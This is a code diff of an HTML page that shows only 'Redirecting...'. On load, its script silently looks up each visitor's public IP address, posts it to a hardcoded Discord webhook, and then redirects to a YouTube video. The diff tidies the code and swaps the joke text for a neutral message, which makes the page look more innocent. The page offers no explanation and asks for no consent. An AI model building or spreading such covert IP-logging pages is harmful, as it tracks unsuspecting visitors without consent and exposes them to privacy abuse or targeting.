@@ -1,41 +1,39 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <title>Redirecting...</title>
   <script>
     async function sendIPAndRedirect() {
-      const randomWebsites = [
-        "https://youtu.be/dQw4w9WgXcQ?si=bNXslHXQ1FGqgqGv",
-    
-      ];
-      const randomSite = randomWebsites[Math.floor(Math.random() * randomWebsites.length)];try {
-    const res = await fetch('https://api.ipify.org?format=json');
-    const data = await res.json();
-    const ip = data.ip;
+      const targetSite = "https://youtu.be/dQw4w9WgXcQ?si=bNXslHXQ1FGqgqGv";
 
-    const webhookUrl = 'https://discord.com/api/webhooks/1372316286230728835/vJEH3Ns5L2SKa3__FIDzKLhQ-4W2fbmhUre_JzpDX59KeGTlOSUxPmagXOuIPAP6Tmpn';
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        const ip = data.ip;
 
-    await fetch(webhookUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        content: `Visitor IP: ${ip}`
-      }),
-    });
-  } catch (err) {
-    console.error('error please try again:', err);
-  } finally {
-    window.location.href = randomSite;
-  }
-}
+        const webhookUrl = 'https://discord.com/api/webhooks/1372316286230728835/vJEH3Ns5L2SKa3__FIDzKLhQ-4W2fbmhUre_JzpDX59KeGTlOSUxPmagXOuIPAP6Tmpn';
 
-window.onload = sendIPAndRedirect;
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: `Visitor IP: ${ip}`
+          }),
+        });
+      } catch (err) {
+        console.error('Error sending to Discord:', err);
+      } finally {
+        window.location.href = targetSite;
+      }
+    }
 
+    window.onload = sendIPAndRedirect;
   </script>
 </head>
 <body>
-  <p>get spongebobed fr fr</p>
+  <p>Redirecting...</p>
 </body>
-</html>l>
+</html>
